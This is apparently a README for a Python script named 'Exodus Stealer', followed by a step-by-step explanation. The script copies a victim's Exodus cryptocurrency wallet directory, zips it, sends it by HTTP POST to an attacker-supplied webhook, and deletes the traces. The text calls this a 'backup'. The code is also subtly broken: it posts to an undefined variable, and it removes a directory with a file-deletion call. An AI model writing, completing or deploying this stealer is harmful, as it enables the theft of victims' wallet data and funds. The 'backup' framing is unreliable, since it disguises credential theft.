# Exodus Stealer

This script backs up the Exodus wallet configuration directory, creates a zip archive of the backup, and sends it to a specified webhook URL using an HTTP POST request. If the backup and zip creation are successful, the script attempts to remove the temporary files created during the backup process.

# Code

```python
import os.path
import shutil
import requests

# Get the user's home directory
user = os.path.expanduser("~")

# Set the webhook URL
api = ""

# Check if the Exodus configuration directory exists in the user's AppData/Roaming folder
if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
    # Copy the Exodus configuration directory to a temporary location in the user's AppData/Local/Temp folder
    shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
    # Create a zip archive of the Exodus configuration directory in the temporary location
    shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")

    # Prepare the zip archive to be sent as a file in a HTTP POST request
    file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
    # Send the HTTP POST request to the specified webhook URL, including the zip archive as a file in the request
    r = requests.post(hook, files=file)

    # Attempt to remove the temporary zip archive and directory
    try:
        os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
        os.remove(user+"\\AppData\\Local\\Temp\\Exodus")
    except:
        # If an error occurs while attempting to remove the files, do nothing
        pass
```

# Explanation

1. Imports the required modules: os.path, shutil, and requests.
2. Gets the path to the user's home directory using os.path.expanduser("~").
3. Sets the api variable to your webhook or api.
4. Checks if the Exodus configuration directory exists in the user's AppData/Roaming folder.
5. If the directory exists, the script performs the following actions:
6. Copies the Exodus configuration directory to a temporary location in the user's AppData/Local/Temp folder using shutil.copytree().
7. Creates a zip archive of the copied directory using shutil.make_archive().
8. Prepares the zip archive to be sent as a file in an HTTP POST request.
9. Sends an HTTP POST request to the specified webhook URL, including the zip archive as a file in the request.
10. Attempts to remove the temporary zip archive and directory using os.remove().
11. If an error occurs while attempting to remove the files, the script does nothing.
12. In summary, this script makes a backup of the Exodus wallet configuration directory, zips the backup, and sends it to a specified webhook URL using an HTTP POST request.



